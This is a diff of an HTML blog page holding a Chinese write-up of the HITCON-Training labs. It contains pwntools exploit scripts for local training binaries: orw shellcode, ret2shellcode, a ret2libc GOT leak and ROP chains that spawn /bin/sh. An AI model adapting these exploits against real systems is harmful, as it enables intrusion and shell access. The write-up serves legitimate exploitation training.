@@ -1,38 +1,88 @@
-<!DOCTYPE html>
+<!doctype html>
+
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-    <meta name="author" content="Marlon Cabrera Oliveira">
-    <meta name="description" content="Hugo theme using tachyons.io & geomicons.com">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700" rel="stylesheet">
-    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|PT+Mono&amp;subset=latin,cyrillic">
-    <link rel="stylesheet" href="/css/tachyons.css">
-    <style>
-        .geomicon { width: 1.5em; height: 1.5em; color: #405660; }
-        body{ font-family:'PT Sans', sans-serif; }
-    </style>
-  </head>
-  <body>
-      <header class="tc pal bb b-near-white">
-    <h1 class="f6 thin i link-child"><a href="/">M4x's Blog</a></h1>
-        <nav>
-          <ul class="list pln">
-            <li class="dib prm"><a href="/post"><span class="js-geomicon geomicon" data-icon="compose"></span>Home</a></li>
-            <li class="dib prm"><a href="/stuff/myworks"><span class="js-geomicon geomicon" data-icon="play"></span>Works</a></li>
-            <li class="dib prm"><a href="/stuff/aboutme"><span class="js-geomicon geomicon" data-icon="user"></span>About</a></li>
-            <li class="dib prm"><a href="http://www.cnblogs.com/WangAoBo/"><span class="js-geomicon geomicon" data-icon="link"></span>Old Blog Link</a></li>
-          </ul>
-        </nav>
-        </header>
+
+<head>
+  <title>M4x&#39;s Blog</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="" />
+  <meta name="generator" content="Hugo 0.44" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="https://0x01f.github.io/css/styles.css" />
+</head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="https://0x01f.github.io/">M4x&rsquo;s Blog</a>
+            </h1>
+
+      <ul id="social-media">
+          
+        <li><a href="https://github.com/0x01f"><i class="fa fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>在学 CTF bin/fuzz/python/shell</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/aboutme/">
+                <i class="fa-li fa  fa-lg"></i><span>About</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/myworks/">
+                <i class="fa-li fa  fa-lg"></i><span>works</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
 
 
-  <main class="pal">
+
+
+<article>
 
     <h1>HITCON-Training-Writeup</h1>
-    <h2>Jul 13, 2018</h2>
-      
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2018-07-13T12:05:10&#43;08:00">Jul 13, 2018</time>
+        </li>
+        
+        
+
+        
+
+        <li>21 min read</li>
+    </ul>
+</aside>
+    
+
+    
 
 <h1 id="hitcon-training-writeup">HITCON-Training-Writeup</h1>
 
@@ -184,16 +234,13 @@
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpngmh9cj30f904gdfx.jpg" alt="" /></p>
 
 <p>直接写出 gdb 脚本</p>
-
-<pre><code class="language-shell">lab1 [master●●] cat solve 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">lab1 <span style="color:#f92672">[</span>master●●<span style="color:#f92672">]</span> cat solve 
 b *get_flag+389
 r
-#your input
-set $eax=$edx
+<span style="color:#75715e">#your input
+</span><span style="color:#75715e"></span>set $eax<span style="color:#f92672">=</span>$edx
 c
-lab1 [master●●] 
-</code></pre>
-
+lab1 <span style="color:#f92672">[</span>master●●<span style="color:#f92672">]</span> </code></pre></div>
 <p>也可得到 flag</p>
 
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmxbneij30qu0c5dll.jpg" alt="" /></p>
@@ -203,57 +250,51 @@ lab1 [master●●]
 <h3 id="lab2-orw-bin">lab2-orw.bin</h3>
 
 <p>通过查看 prctl 的 man 手册发现该程序限制了一部分系统调用，根据题目的名字 open, read, write以及IDA分析，很明显是要我们自己写读取并打印 flag 的 shellcode 了，偷个懒，直接调用 shellcraft 模块</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab2 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab2 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> shellcraft <span style="color:#66d9ef">as</span> sc
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
 
-from pwn import *
-from pwn import shellcraft as sc
-context.log_level = &quot;debug&quot;
+shellcode <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>pushstr(<span style="color:#e6db74">&#34;/home/m4x/HITCON-Training/LAB/lab2/testFlag&#34;</span>)
+shellcode <span style="color:#f92672">+=</span> sc<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;esp&#34;</span>)
+<span style="color:#75715e">#  open返回的文件文件描述符存贮在eax寄存器里 </span>
+shellcode <span style="color:#f92672">+=</span> sc<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;eax&#34;</span>, <span style="color:#e6db74">&#34;esp&#34;</span>, <span style="color:#ae81ff">0x100</span>)
+<span style="color:#75715e">#  open读取的内容放在栈顶 </span>
+shellcode <span style="color:#f92672">+=</span> sc<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;esp&#34;</span>, <span style="color:#ae81ff">0x100</span>)
 
-shellcode = sc.pushstr(&quot;/home/m4x/HITCON-Training/LAB/lab2/testFlag&quot;)
-shellcode += sc.open(&quot;esp&quot;)
-#  open返回的文件文件描述符存贮在eax寄存器里 
-shellcode += sc.read(&quot;eax&quot;, &quot;esp&quot;, 0x100)
-#  open读取的内容放在栈顶 
-shellcode += sc.write(1, &quot;esp&quot;, 0x100)
-
-io = process(&quot;./orw.bin&quot;)
-io.sendlineafter(&quot;shellcode:&quot;, asm(shellcode))
-print io.recvall()
-io.close()
-lab2 [master●●] 
-</code></pre>
-
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./orw.bin&#34;</span>)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;shellcode:&#34;</span>, asm(shellcode))
+<span style="color:#66d9ef">print</span> io<span style="color:#f92672">.</span>recvall()
+io<span style="color:#f92672">.</span>close()
+lab2 [master<span style="color:#960050;background-color:#1e0010">●●</span>] </code></pre></div>
 <p>该题与 pwnable.tw 的 orw 类似，那道题的 writeup 很多，因此就不说直接撸汇编的方法了</p>
 
 <h3 id="lab3-ret2sc">lab3-ret2sc</h3>
 
 <p>很简单的 ret2shellcode，程序没有开启 NX 和 canary 保护，把 shellcode 存贮在 name 这个全局变量上，并 ret 到该地址即可</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab3 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab3 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;linux&#34;</span>, arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;i386&#34;</span>)
 
-from pwn import *
-context(os = &quot;linux&quot;, arch = &quot;i386&quot;)
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./ret2sc&#34;</span>)
 
-io = process(&quot;./ret2sc&quot;)
+shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, shellcode)
 
-shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))
-io.sendlineafter(&quot;:&quot;, shellcode)
+payload <span style="color:#f92672">=</span> flat(cyclic(<span style="color:#ae81ff">32</span>), <span style="color:#ae81ff">0x804a060</span>)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, payload)
 
-payload = flat(cyclic(32), 0x804a060)
-io.sendlineafter(&quot;:&quot;, payload)
-
-io.interactive()
-io.close()
-lab3 [master●●] 
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()
+lab3 [master<span style="color:#960050;background-color:#1e0010">●●</span>] </code></pre></div>
 <p>需要注意的是，该程序中的 read 是通过 esp 寻址的，因此具体的 offset 可以通过调试查看</p>
 
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg" alt="" /></p>
@@ -263,34 +304,31 @@ lab3 [master●●]
 <h3 id="lab4-ret2lib">lab4-ret2lib</h3>
 
 <p>ret2libc，并且程序中已经有了一个可以查看 got 表中值的函数 See_something，直接 leak 出 libcBase，通过 one_gadget 或者 system(&ldquo;/bin/sh&rdquo;) 都可以 get shell，/bin/sh 可以使用 libc 中的字符串，可以通过 read 读入到内存中，也可以使用 binary 中的字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab4 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab4 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./ret2lib&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2lib&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>)
 
-io = process(&quot;./ret2lib&quot;)
-elf = ELF(&quot;./ret2lib&quot;)
-libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]))
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; : &#34;</span>)
+libcBase <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop <span style="color:#f92672">=</span> True), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]
 
-io.sendlineafter(&quot; :&quot;, str(elf.got[&quot;puts&quot;]))
-io.recvuntil(&quot; : &quot;)
-libcBase = int(io.recvuntil(&quot;\n&quot;, drop = True), 16) - libc.symbols[&quot;puts&quot;]
+success(<span style="color:#e6db74">&#34;libcBase -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libcBase))
+<span style="color:#75715e">#  oneGadget = libcBase + 0x3a9fc</span>
 
-success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
-#  oneGadget = libcBase + 0x3a9fc
+<span style="color:#75715e">#  payload = flat(cyclic(60), oneGadget)</span>
+payload <span style="color:#f92672">=</span> flat(cyclic(<span style="color:#ae81ff">60</span>), libcBase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>], <span style="color:#ae81ff">0xdeadbeef</span>, next(elf<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)))
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, payload)
 
-#  payload = flat(cyclic(60), oneGadget)
-payload = flat(cyclic(60), libcBase + libc.symbols[&quot;system&quot;], 0xdeadbeef, next(elf.search(&quot;sh\x00&quot;)))
-io.sendlineafter(&quot; :&quot;, payload)
-
-io.interactive()
-io.close()
-lab4 [master●●] 
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()
+lab4 [master<span style="color:#960050;background-color:#1e0010">●●</span>] </code></pre></div>
 <h3 id="lab5-simplerop">lab5-simplerop</h3>
 
 <p>本来看程序是静态链接的，想通过 ROPgadget/ropper 等工具生成的 ropchain 一波带走，但实际操作时发现 read 函数只允许读入100个字符，去除 buf 到 main 函数返回地址的偏移为 32，我们一共有 100 - 32 = 68 的长度来构造 ropchain，而 ropper/ROPgadget 等自动生成的 ropchain 都大于这个长度，这就需要我们精心设计 ropchain 了，这里偷个懒，优化一下 ropper 生成的 ropchain 来缩短长度</p>
@@ -302,102 +340,96 @@ lab4 [master●●]
 </blockquote>
 
 <p>先看一下 ropper 生成的 ropchain</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># Generated by ropper ropchain generator #</span>
+<span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
 
-<pre><code class="language-python">#!/usr/bin/env python
-# Generated by ropper ropchain generator #
-from struct import pack
+p <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : pack(<span style="color:#e6db74">&#39;I&#39;</span>, x)
 
-p = lambda x : pack('I', x)
+IMAGE_BASE_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048000</span> <span style="color:#75715e"># ./simplerop</span>
+rebase_0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p(x <span style="color:#f92672">+</span> IMAGE_BASE_0)
 
-IMAGE_BASE_0 = 0x08048000 # ./simplerop
-rebase_0 = lambda x : p(x + IMAGE_BASE_0)
+rop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 
-rop = ''
-
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += '//bi'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3060)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += 'n/sh'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3064)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += p(0x00000000)
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3068)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
-rop += rebase_0(0x000a3060)
-rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
-rop += rebase_0(0x000a3068)
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3068)
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += p(0x0000000b)
-rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
-print rop
-[INFO] rop chain generated!
-</code></pre>
-
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;//bi&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;n/sh&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3064</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0x00000000</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3068</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000001c9</span>) <span style="color:#75715e"># 0x080481c9: pop ebx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0009e910</span>) <span style="color:#75715e"># 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3068</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3068</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0x0000000b</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00026ef0</span>) <span style="color:#75715e"># 0x0806eef0: int 0x80; ret; </span>
+<span style="color:#66d9ef">print</span> rop
+[INFO] rop chain generated<span style="color:#960050;background-color:#1e0010">!</span></code></pre></div>
 <p>简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(&ldquo;/bin/sh&rdquo;, 0, 0)，hackme.inndy 上也有一道类似的题目<a href="http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3"><strong>ROP2</strong></a></p>
 
 <p>而当观察 ropper 等工具自动生成的 ropchain 时，会发现有很多步骤是很繁琐的，可以做出很多优化，给一个优化后的例子</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># Generated by ropper ropchain generator #</span>
+<span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
 
-<pre><code class="language-python">#!/usr/bin/env python
-# Generated by ropper ropchain generator #
-from struct import pack
+p <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : pack(<span style="color:#e6db74">&#39;I&#39;</span>, x)
 
-p = lambda x : pack('I', x)
+IMAGE_BASE_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048000</span> <span style="color:#75715e"># ./simplerop</span>
+rebase_0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p(x <span style="color:#f92672">+</span> IMAGE_BASE_0)
 
-IMAGE_BASE_0 = 0x08048000 # ./simplerop
-rebase_0 = lambda x : p(x + IMAGE_BASE_0)
+pop_edx_ecx_ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806e850</span>
 
-pop_edx_ecx_ebx = 0x0806e850
+rop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 
-rop = ''
+<span style="color:#75715e"># write /bin/sh\x00 to 0x08048000 + 0x000a3060</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+<span style="color:#75715e">#  rop += &#39;//bi&#39;</span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3064</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+]write /bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> to 0x08048000 + 0x000a3060&#34;</span>
 
-# write /bin/sh\x00 to 0x08048000 + 0x000a3060
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-#  rop += '//bi'
-rop += '/bin'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3060)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += '/sh\x00'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3064)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-print &quot;[+]write /bin/sh\x00 to 0x08048000 + 0x000a3060&quot;
+<span style="color:#75715e">#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; </span>
+<span style="color:#75715e">#  rop += p(0x00000000)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3060)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
 
-#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-#  rop += p(0x00000000)
-#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-#  rop += rebase_0(0x000a3068)
-#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
-#  rop += rebase_0(0x000a3060)
-#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
-#  rop += rebase_0(0x000a3068)
-#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-#  rop += rebase_0(0x000a3068)
+<span style="color:#75715e"># set ebx -&gt; /bin/sh\x00, ecx = edx = 0</span>
+rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;I&#39;</span>, pop_edx_ecx_ebx)
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0</span>)
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+]set ebx -&gt; /bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">, ecx = edx = 0&#34;</span>
 
-# set ebx -&gt; /bin/sh\x00, ecx = edx = 0
-rop += pack('I', pop_edx_ecx_ebx)
-rop += p(0)
-rop += p(0)
-rop += rebase_0(0x000a3060)
-print &quot;[+]set ebx -&gt; /bin/sh\x00, ecx = edx = 0&quot;
-
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += p(0x0000000b)
-rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
-asset len(rop) &lt;= 100 - 32
-</code></pre>
-
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0x0000000b</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00026ef0</span>) <span style="color:#75715e"># 0x0806eef0: int 0x80; ret; </span>
+asset len(rop) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">32</span></code></pre></div>
 <p>注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程</p>
 
 <blockquote>
@@ -405,71 +437,68 @@ asset len(rop) &lt;= 100 - 32
 </blockquote>
 
 <p>最终脚本:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab5 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab5 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
